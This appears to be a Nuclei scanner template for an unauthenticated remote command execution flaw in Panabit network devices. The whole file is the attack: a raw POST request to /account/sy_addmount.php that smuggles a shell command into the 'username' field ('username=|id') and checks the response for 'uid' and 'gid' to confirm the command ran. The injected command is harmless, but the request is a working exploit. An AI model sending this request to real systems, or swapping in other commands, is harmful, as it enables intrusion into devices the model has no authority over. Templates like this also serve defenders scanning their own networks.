id: Panabit-rce
info:
  author: Str1am
  name: "Panabit \u524D\u53F0\u547D\u4EE4\u6267\u884C"
  severity: high
  tags: Panabit,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - uid
    - gid
  matchers-condition: and
  raw:
  - 'POST /account/sy_addmount.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    username=|id

    '
